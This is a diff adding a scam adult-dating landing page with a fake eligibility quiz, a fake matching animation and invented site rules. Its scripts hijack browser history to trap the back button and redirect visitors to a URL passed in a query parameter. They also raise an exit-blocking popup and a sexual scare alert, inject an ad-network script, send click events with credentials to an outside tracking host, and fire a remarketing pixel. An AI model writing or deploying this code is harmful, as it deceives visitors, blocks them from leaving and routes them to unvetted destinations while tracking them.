@@ -1,0 +1,209 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"><html><head>
+  <base href="">
+
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <title>Only sex!</title>
+    <meta name="viewport" content="user-scalable=false; initial-scale=1.0; maximum-scale=1.0">
+    <link href="style.css" rel="stylesheet">
+
+    <script src="detect.min.js" charset="utf-8"></script>
+    <script src="service-worker.js" charset="utf-8"></script>
+  <script>
+
+    (function(){
+
+      var domain = 'trk.alexhu.work';
+      var protocol = 'https';
+
+      window.afilter = function(event,detail,token){
+
+        if(Number(event) <= 0) return;
+
+        var xhr = new XMLHttpRequest();
+        xhr.open('POST', protocol + '://' + domain +'/p/events', true);
+        xhr.withCredentials = true;
+        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+        xhr.send("et=" + event + "&v=" + detail + "&t=" + token);
+
+      };
+
+      window.atgo = function(url){
+        window.location.replace(protocol + '://' + domain + '/' + url);
+      };
+
+    }());
+
+  </script>
+    <script type="text/javascript">
+      atOptions = {
+        'key': '2144a2c691b9df0835858375987cdca5',
+        'format': 'js',
+        'params': {}
+      };
+
+      var user = detect.parse(navigator.userAgent);
+      console.log(user.device.type);
+
+      if (user.device.type == 'Desktop') {
+        document.write('<scr' + 'ipt type="text/javascript" src="http' + (location.protocol === 'https:' ? 's' : '') + '://www.modulepush.com/2144a2c691b9df0835858375987cdca5/invoke.js"></scr' + 'ipt>');
+      };
+    </script>
+  <script>
+    function getURLParameter(name) {
+      return decodeURI(
+        (RegExp(name + '=' +'(.+?)(&|$)').exec(location.search) || [, null])[1] || ''
+      );
+    }
+  </script><script type="text/javascript">
+    function one() {
+      location.href = decodeURIComponent(getURLParameter('p1'));
+      PreventExitPop = false;
+    };
+  </script><script type="text/javascript">
+    ! function() {
+      var t;
+      try {
+        for (t = 0; 10 > t; ++t) history.pushState({}, "", "#");
+        onpopstate = function(t) {
+          t.state && location.replace(decodeURIComponent(getURLParameter('p1')))
+        }
+      } catch (o) {}
+    }();
+  </script><script>
+    setTimeout(function() {
+      alert("WARNING! \r\n Women you know and women near you are looking for a FUCK BUDDY tonight! \r\n Do you want to see their photos? ")
+    }, 400);
+  </script><script language="javascript">
+    var PreventExitPop = true;
+
+    function ExitPop() {
+      if (PreventExitPop != false) {
+        return "Hold on!"
+      }
+    }
+    window.onbeforeunload = ExitPop;
+  </script></head>
+
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  <body>
+    <div id="wrapper">
+      <div id="header">
+        <div id="tagline" onclick="one();"> The World's Largest sex hookup and singles site. </div>
+      </div>
+      <div id="main">
+        <div id="step1"><img src="1.jpg" class="image">
+          <h1>Are you over 21?</h1>
+        </div>
+        <div id="step2" style="display:none"><img src="2.jpg" class="image">
+          <h1>Are you free from STDs?</h1>
+        </div>
+        <div id="step3" style="display:none"><img src="3.jpg" class="image">
+          <h1>When having sex with our members will you use a condom?</h1>
+        </div>
+        <div id="step4" style="display:none">
+          <img src="5.jpg" class="image">
+          <h2 id="s1">Analyzing your answers...</h2>
+          <h2 id="s2" style="display:none">Duplicate registrations are being reviewed</h2>
+          <h2 id="s3" style="display:none">Matching sex-partners...</h2>
+          <h2 id="s4" style="display:none">Looking for registration options</h2>
+          <img src="loading2.gif" id="load">
+        </div>
+        <div id="step5" style="display:none">
+          <h4><span style="color:#d70016">Congratulations!</span> You qualify for our site!<br> Before you register you must <br> agree to our rules:</h4>
+          <div class="ram">
+            <ul class="decimal">
+              <li class="one">1. If you see someone you know, do not publicize it. Do not spread rumors.</li>
+              <li class="two">2. When having sex with one of our members, it is YOUR responsibility to protect yourself against STDs.</li>
+              <li class="three">3. Respect the sexual desires of others members. Our users are normal women, not prostitues or pornstars. </li>
+            </ul>
+          </div>
+          <div class="button_sub btn-for-px" onclick="atgo('click');">I AGREE</div>
+          
+        </div>
+        <div style="width: 270px; margin:20px auto 0 auto;" id="ans"><span class="button_yes" id="nexty" onclick="afilter(1);">YES</span><span class="button_no" id="nextn" onclick="afilter(1);">NO</span>
+        </div>
+      </div>
+    </div>
+    <script src="jquery.min.js"></script>
+    <script type="text/javascript">
+      var cur_step = 0;
+
+      function change_step(cur) {
+        if (cur == 1) {
+          $('#step1').hide();
+          $('#step2').show();
+        } else if (cur == 2) {
+          $('#step2').hide();
+          $('#step3').show();
+        } else if (cur == 3) {
+          $('#step3').hide();
+          $('#ans').hide();
+          $('#step4').show();
+          setTimeout(function() {
+            ans_ana(1)
+          }, 1000);
+          setTimeout(function() {
+            ans_ana(2)
+          }, 2000);
+          setTimeout(function() {
+            ans_ana(3)
+          }, 3000);
+          setTimeout(function() {
+            ans_ana(4)
+          }, 4000);
+        } else if (cur == 4) {
+          $('#load').hide();
+          $('#step4').slideUp(1000, function() {
+            $('#step5').show();
+          });
+        }
+        return false;
+      }
+
+      function ans_ana(cur) {
+        $('#s' + cur).hide();
+        cur++;
+        if (cur != 5)
+          $('#s' + cur).show();
+        else
+          change_step(4);
+        return false;
+      }
+
+      $(document).ready(function() {
+        $('#nexty').click(function() {
+          change_step(cur_step + 1);
+          cur_step++;
+          return false;
+        });
+        $('#nextn').click(function() {
+          change_step(cur_step + 1);
+          cur_step++;
+          return false;
+        });
+      });
+    </script>
+
+    <script>
+//Pixel
+var btnForPx = document.querySelector('.btn-for-px');
+
+btnForPx.addEventListener('click', function() {
+  (new Image()).src = '//r.remarketingpixel.com/px.gif?akey=8a36d410574fca97773af09536c92a2c';
+});
+</script>
+
+
+  
+
+</body></html>
